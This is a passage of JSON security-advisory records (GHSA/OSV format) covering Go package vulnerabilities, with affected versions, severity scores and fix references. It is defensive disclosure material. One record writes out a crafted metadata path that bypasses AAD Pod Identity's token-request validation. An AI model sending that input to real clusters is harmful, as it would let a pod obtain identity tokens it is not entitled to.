"https://github.com/csaf-poc/csaf_distribution/commit/17f22855ee8d4270dd17ff748c30ed7304846fdc"}, {"type": "PACKAGE", "url": "https://github.com/csaf-poc/csaf_distribution"}, {"type": "WEB", "url": "https://github.com/csaf-poc/csaf_distribution/releases/tag/v0.8.2"}, {"type": "WEB", "url": "https://wid.cert-bund.de/.well-known/csaf/white/2022/bsi-2022-0003.json"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-14T14:06:08Z", "nvd_published_at": "2022-12-13T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3fm3-m23v-5r46", "modified": "2023-01-10T15:58:49Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2019-25072"], "summary": "Tendermint Client package vulnerable to Uncontrolled Resource Consumption", "details": "Due to support of Gzip compression in request bodies, as well as a lack of limiting response body sizes, a malicious server can cause a client to consume a significant amount of system resources, which may be used as a denial of service vector.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tendermint/tendermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.31.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-25072"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/pull/3430"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/commit/03085c2da23b179c4a51f59a03cb40aa4e85a613"}, {"type": "PACKAGE", "url": "https://github.com/tendermint/tendermint"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0037"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:15:32Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vh43-cc6x-prpr", "modified": "2023-01-10T15:48:04Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4848"], "summary": "usememos/memos vulnerable to Improper Verification of Source of a Communication Channel", "details": "Improper Verification of Source of a Communication Channel in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4848"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/25de88cc-8d0d-41a1-b069-9ef1327770bc"}], "database_specific": {"cwe_ids": ["CWE-940"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:51:51Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jwrv-x6rx-8vfm", "modified": "2023-01-06T22:14:29Z", "published": "2022-12-25T12:30:25Z", "aliases": ["CVE-2020-36627"], "summary": "Macaron i18n Open Redirect vulnerability", "details": "A vulnerability was found in Macaron i18n. It has been declared as problematic. Affected by this vulnerability is an unknown functionality of the file i18n.go. The manipulation leads to open redirect. The attack can be launched remotely. Upgrading to version 0.5.0 can address this issue. The name of the patch is 329b0c4844cc16a5a253c011b55180598e707735. It is recommended to upgrade the affected component. The identifier VDB-216745 was assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-macaron/i18n"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36627"}, {"type": "WEB", "url": "https://github.com/go-macaron/i18n/commit/329b0c4844cc16a5a253c011b55180598e707735"}, {"type": "PACKAGE", "url": "https://github.com/go-macaron/i18n"}, {"type": "WEB", "url": "https://github.com/go-macaron/i18n/releases/tag/v0.5.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1187"}, {"type": "WEB", "url": "https://vuldb.com/?id.216745"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T17:19:29Z", "nvd_published_at": "2022-12-25T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hhxg-px5h-jc32", "modified": "2023-01-09T21:58:58Z", "published": "2022-12-30T12:30:25Z", "aliases": ["CVE-2018-25060"], "summary": "Macaron csrf missing encryption and has sensitive cookies in HTTP session without secure attribute", "details": "A vulnerability was found in Macaron csrf and classified as problematic. Affected by this issue is some unknown functionality of the file `csrf.go`. The manipulation of the argument Generate leads to sensitive cookie without secure attribute. The attack may be launched remotely. The name of the patch is dadd1711a617000b70e5e408a76531b73187031c. It is recommended to apply a patch to fix this issue. VDB-217058 is the identifier assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-macaron/csrf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20180426211050-dadd1711a617"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-25060"}, {"type": "WEB", "url": "https://github.com/go-macaron/csrf/pull/7"}, {"type": "WEB", "url": "https://github.com/go-macaron/csrf/commit/dadd1711a617000b70e5e408a76531b73187031c"}, {"type": "PACKAGE", "url": "https://github.com/go-macaron/csrf"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1213"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.217058"}, {"type": "WEB", "url": "https://vuldb.com/?id.217058"}], "database_specific": {"cwe_ids": ["CWE-311", "CWE-614"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:58:58Z", "nvd_published_at": "2022-12-30T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qr52-59r6-49f4", "modified": "2023-01-02T20:21:58Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4684"], "summary": "usememos/memos Improper Access Control vulnerability", "details": "Improper Access Control in GitHub repository usememos/memos prior to 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4684"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/dca35bde877aab6e64ef51b52e590b5d48f692f9"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/b66f2bdd-8b41-456c-bf65-92302c2e03b5"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T16:27:48Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mfmp-8mqg-q4wm", "modified": "2023-01-10T15:46:53Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4803"], "summary": "usememos/memos Improper Access Control vulnerability", "details": "usememos/memos 0.9.0 and prior is vulnerable to Improper Access Control.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4803"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/0fba72b9-db10-4d9f-a707-2acf2004a286"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-639"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:58:20Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p82q-rxpm-hjpc", "modified": "2022-12-21T19:26:02Z", "published": "2022-12-21T18:48:22Z", "aliases": ["CVE-2022-23551"], "summary": "AAD Pod Identity obtaining token with backslash", "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\nThe [NMI](https://azure.github.io/aad-pod-identity/docs/concepts/nmi/) component in AAD Pod Identity intercepts and validates token requests based on regex. In this case, a token request made with backslash in the request (example: `/metadata/identity\\oauth2\\token/`) would bypass the NMI validation and be sent to [IMDS](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=windows) allowing a pod in the cluster to access identities that it shouldn't have access to.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n- We analyzed this bug and determined that we needed to fix it. This fix has been included in AAD Pod Identity release [v1.8.13](https://github.com/Azure/aad-pod-identity/releases/tag/v1.8.13)\n- If using the [AKS pod-managed identities add-on](https://learn.microsoft.com/en-us/azure/aks/use-azure-ad-pod-identity), no action is required. The clusters should now be running the `v1.8.13` release.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in [Azure/aad-pod-identity](https://github.com/Azure/aad-pod-identity)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:L/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/Azure/aad-pod-identity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.13"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/Azure/aad-pod-identity/security/advisories/GHSA-p82q-rxpm-hjpc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23551"}, {"type": "WEB", "url": "https://github.com/Azure/aad-pod-identity/commit/7e01970391bde6c360d077066ca17d059204cb5d"}, {"type": "PACKAGE", "url": "https://github.com/Azure/aad-pod-identity"}, {"type": "WEB", "url": "https://github.com/Azure/aad-pod-identity/releases/tag/v1.8.13"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-21T18:48:22Z", "nvd_published_at": "2022-12-21T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h2ph-vhm7-g4hp", "modified": "2022-12-09T15:20:21Z", "published": "2022-12-08T16:11:37Z", "aliases": ["CVE-2022-23469"], "summary": "Traefik may display authorization header in the debug logs", "details": "### Impact\n\nThere is a potential vulnerability in Traefik displaying the Authorization header in its debug logs.\n\nTraefik uses [oxy](https://github.com/vulcand/oxy) to provide the following features:\n\n- Round Robin: https://doc.traefik.io/traefik/routing/services/#weighted-round-robin-service\n- Buffering: https://doc.traefik.io/traefik/middlewares/http/buffering/\n- Circuit Breaker: https://doc.traefik.io/traefik/middlewares/http/circuitbreaker/\n- In-Flight Requests: https://doc.traefik.io/traefik/middlewares/http/inflightreq/\n\nIn such cases, if the log level is set to DEBUG, the credentials provided using the Authorization header are displayed in the debug logs:\n\n```\nlevel=debug msg=\"vulcand/oxy/roundrobin/rr: completed ServeHttp on request\" Request=\"{\\\\\"Method\\\\\":\\\\\"POST\\\\\",\\\\\"URL\\\\\":{\\\\\"Scheme\\\\\":\\\\\"\\\\\",\\\\\"Opaque\\\\\":\\\\\"\\\\\",\\\\\"User\\\\\":null,\\\\\"Host\\\\\":\\\\\"\\\\\",\\\\\"Path\\\\\":\\\\\"/<redacted>/<redacted>\\\\\",\\\\\"RawPath\\\\\":\\\\\"\\\\\",\\\\\"ForceQuery\\\\\":false,\\\\\"RawQuery\\\\\":\\\\\"\\\\\",\\\\\"Fragment\\\\\":\\\\\"\\\\\",\\\\\"RawFragment\\\\\":\\\\\"\\\\\"},\\\\\"Proto\\\\\":\\\\\"HTTP/2.0\\\\\",\\\\\"ProtoMajor\\\\\":2,\\\\\"ProtoMinor\\\\\":0,\\\\\"Header\\\\\":{\\\\\"Authorization\\\\\":[\\\\\"Bearer <token value was here>\\\\\"],\\\\\"Content-Type\\\\\":[\\\\\"application/grpc\\\\\"],\\\\\"Grpc-Accept-Encoding\\\\\":[\\\\\"gzip\\\\\"],\\\\\"Grpc-Timeout\\\\\":[\\\\\"29999886u\\\\\"],\\\\\"Te\\\\\":[\\\\\"trailers\\\\\"],\\\\\"User-Agent\\\\\":[\\\\\"<redacted>\\\\\"],<remainder of log message removed>\n```\n\n### Patches\n\nhttps://github.com/traefik/traefik/pull/9574\nhttps://github.com/traefik/traefik/releases/tag/v2.9.6\n\n### Workarounds\n\nSet the log level to `INFO`, `WARN`, or `ERROR`.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.9.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-h2ph-vhm7-g4hp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23469"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/pull/9574"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.9.6"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-532"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-12-08T16:11:37Z", "nvd_published_at": "2022-12-08T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r88r-gmrh-7j83", "modified": "2023-01-10T15:50:24Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2021-4235"], "summary": "YAML Go package vulnerable to denial of service", "details": "Due to unbounded alias chasing, a maliciously crafted YAML file can cause the system to consume significant system resources. If parsing user input, this may be used as a denial of service vector.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gopkg.in/yaml.v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/go-yaml/yaml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4235"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/pull/375"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/commit/bb4e33bf68bf89cad44d386192cbed201f35b241"}, {"type": "PACKAGE", "url": "https://github.com/go-yaml/yaml"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0061"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:02:10Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4348-x292-h437", "modified": "2023-01-06T03:19:36Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2022-2583"], "summary": "GoBase Race Condition vulnerability", "details": "A race condition can cause incorrect HTTP request routing.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ntbosscher/gobase"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2583"}, {"type": "WEB", "url": "https://github.com/ntbosscher/gobase/commit/a8d40bce9c429d324122d18c446924dab809e812"}, {"type": "PACKAGE", "url": "https://github.com/ntbosscher/gobase"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0400"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:04:09Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cwh7-28vg-jmpr", "modified": "2023-01-10T16:12:39Z", "published": "2022-12-30T12:30:25Z", "aliases": ["CVE-2018-25059"], "summary": "pastebinit Path Traversal vulnerability", "details": "A vulnerability was found in pastebinit up to 0.2.2 and classified as problematic. Affected by this issue is the function pasteHandler of the file server.go. The manipulation of the argument `r.URL.Path` leads to path traversal. Upgrading to version 0.2.3 can address this issue. The name of the patch is 1af2facb6d95976c532b7f8f82747d454a092272. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-217040.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/jessfraz/pastebinit"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-25059"}, {"type": "WEB", "url": "https://github.com/jessfraz/pastebinit/pull/3"}, {"type": "WEB", "url": "https://github.com/jessfraz/pastebinit/commit/1af2facb6d95976c532b7f8f82747d454a092272"}, {"type": "PACKAGE", "url": "https://github.com/jessfraz/pastebinit"}, {"type": "WEB", "url": "https://github.com/jessfraz/pastebinit/releases/tag/v0.2.3"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.217040"}, {"type": "WEB", "url": "https://vuldb.com/?id.217040"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-03T12:28:42Z", "nvd_published_at": "2022-12-30T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fjgq-224f-fq37", "modified": "2023-03-01T18:36:23Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2019-25073"], "summary": "Goa vulnerable to path traversal", "details": "Improper path santiziation in github.com/goadesign/goa before v3.0.9, v2.0.10, or v1.4.3 allow remote attackers to read files outside of the intended directory", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goadesign/goa"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.3"}]}]}, {"package": {"ecosystem": "Go", "name": "goa.design/goa"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.3"}]}]}, {"package": {"ecosystem": "Go", "name": "goa.design/goa/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-25073"}, {"type": "WEB", "url": "https://github.com/goadesign/goa/pull/2388"}, {"type": "WEB", "url": "https://github.com/goadesign/goa/commit/70b5a199d0f813d74423993832c424e1fc73fb39"}, {"type": "PACKAGE", "url": "https://github.com/goadesign/goa"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0032"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:24:57Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gfj4-wg89-m22r", "modified": "2023-01-10T15:42:51Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4807"], "summary": "usememos/memos Improper Access Control vulnerability", "details": "In usememos/memos 0.9.0 and prior, users can edit and delete all other users' shortcuts.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4807"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/704c9ed7-2120-47ea-aaf0-5fdcbd492954"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:09:27Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m3q4-7qmj-657m", "modified": "2022-12-20T19:33:27Z", "published": "2022-12-20T19:33:27Z", "aliases": ["CVE-2022-23542"], "summary": "OpenFGA Authorization Bypass", "details": "### Overview\nDuring our internal security assessment, it was discovered that OpenFGA versions v0.3.0 is vulnerable to authorization bypass under certain conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if **all** of the following applies:\n\n1.  You are using OpenFGA v0.3.0\n2. You created a model using modeling language v1.1 that applies a type restriction to an object e.g. `define viewer: [user]`\n3. You created tuples based on the aforementioned model, e.g. `document:1#viewer@user:jon`\n4. You updated the previous model by adding a new type and replacing the previous restriction with the newly added type e.g. `define viewer: [employee]`\n5. You use the tuples created against the first model (step 3) and issue checks against the updated model e.g. `user=user:jon, relation=viewer, object:document:1`\n\n### How to fix that?\nUpgrade to version v0.3.1\n\n### Backward Compatibility\nThis update is backward compatible.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.0"}, {"fixed": "0.3.1"}]}], "versions": ["0.3.0"]}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-m3q4-7qmj-657m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23542"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/pull/422"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/releases/tag/v0.3.1"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-20T19:33:27Z", "nvd_published_at": "2022-12-20T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m5pr-wm6q-x4g2", "modified": "2023-01-10T15:44:18Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4812"], "summary": "usememos/memos vulnerable to Comparison of Object References Instead of Object Contents", "details": "Comparison of Object References Instead of Object Contents in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4812"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/33924891-5c36-4b46-b417-98eaab688c4c"}], "database_specific": {"cwe_ids": ["CWE-595", "CWE-639"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:11:56Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3839-6r69-m497", "modified": "2023-01-06T03:20:27Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2021-4238"], "summary": "GoUtils's randomly-generated alphanumeric strings contain significantly less entropy than expected", "details": "Randomly-generated alphanumeric strings contain significantly less entropy than expected. The `RandomAlphaNumeric` and `CryptoRandomAlphaNumeric` functions always return strings containing at least one digit from 0 to 9. This significantly reduces the amount of entropy in short strings generated by these functions.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/Masterminds/goutils"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4238"}, {"type": "WEB", "url": "https://github.com/Masterminds/goutils/commit/869801f20f9f1e7ecdbdb6422049d8241270d5e1"}, {"type": "PACKAGE", "url": "https://github.com/Masterminds/goutils"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0411"}], "database_specific": {"cwe_ids": ["CWE-331"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:53:53Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-67fx-wx78-jx33", "modified": "2023-08-30T18:38:16Z", "published": "2022-12-14T21:39:06Z", "aliases": ["CVE-2022-23526"], "summary": "Helm vulnerable to denial of service through schema file", "details": "Fuzz testing, by Ada Logics and sponsored by the CNCF, identified input to functions in the `_chartutil_` package that can cause a segmentation violation. Applications that use functions from the `_chartutil_` package in the Helm SDK can have a Denial of Service attack when they use this package and it panics.\n\n### Impact\n\nThe `_chartutil_` package contains a parser that loads a JSON Schema validation file. For example, the Helm client when rendering a chart will validate its values with the schema file. The `_chartutil_` package parses the schema file and loads it into structures Go can work with. Some schema files can cause array data structures to be created causing a memory violation.\n\nApplications that use the `_chartutil_` package in the Helm SDK to parse a schema file can suffer a Denial of Service when that input causes a panic that cannot be recovered from.\n\nThe Helm Client will panic with a schema file that causes a memory violation panic. Helm is not a long running service so the panic will not affect future uses of the Helm client.\n\n### Patches\n\nThis issue has been resolved in 3.10.3. \n\n### Workarounds\n\nSDK users can validate schema files that are correctly formatted before passing them to the `_chartutil_` functions.\n\n### For more information\n\nHelm's security policy is spelled out in detail in our [SECURITY](https://github.com/helm/community/blob/master/SECURITY.md) document.\n\n### Credits\n\nDisclosed by Ada Logics in a fuzzing audit sponsored by CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.10.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-67fx-wx78-jx33"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23526"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/bafafa8bb1b571b61d7a9528da8d40c307dade3d"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1166"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-14T21:39:06Z", "nvd_published_at": "2022-12-15T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-468w-8x39-gj5v", "modified": "2022-12-12T22:26:28Z", "published": "2022-12-08T16:11:12Z", "aliases": ["CVE-2022-46153"], "summary": "Traefik routes exposed with an empty TLSOption", "details": "## Impact\n\nThere is a potential vulnerability in Traefik managing the TLS connections.\n\nA router configured with a not well-formatted [TLSOption](https://doc.traefik.io/traefik/v2.9/https/tls/#tls-options) is exposed with an empty TLSOption.\n\nFor instance, a route secured using an mTLS connection set with a wrong CA file is exposed without verifying the client certificates.\n\n## Patches\n\nhttps://github.com/traefik/traefik/releases/tag/v2.9.6\n\n## Workarounds\n\nCheck the logs to detect the following error messages and fix your TLS options:\n\n- Empty CA:\n\n```\n{\"level\":\"error\",\"msg\":\"invalid clientAuthType: RequireAndVerifyClientCert, CAFiles is required\",\"routerName\":\"Router0@file\"}\n```\n\n- Bad CA content (or bad path):\n\n```\n{\"level\":\"error\",\"msg\":\"invalid certificate(s) content\",\"routerName\":\"Router0@file\"}\n```\n\n- Unknown Client Auth 